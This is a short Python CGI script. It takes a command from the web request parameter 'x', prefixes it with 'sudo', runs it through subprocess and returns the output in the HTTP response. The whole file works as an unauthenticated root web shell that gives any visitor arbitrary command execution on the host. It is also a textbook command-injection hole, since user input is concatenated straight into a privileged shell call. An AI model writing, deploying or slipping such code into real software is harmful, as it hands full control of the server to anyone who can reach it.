#!/usr/bin/python3


print("content-type: text/html")
print()

import subprocess as sp
import cgi
f=cgi.FieldStorage()
cmd=f.getvalue("x")
op=sp.getstatusoutput("sudo "+cmd)
print(op[1])

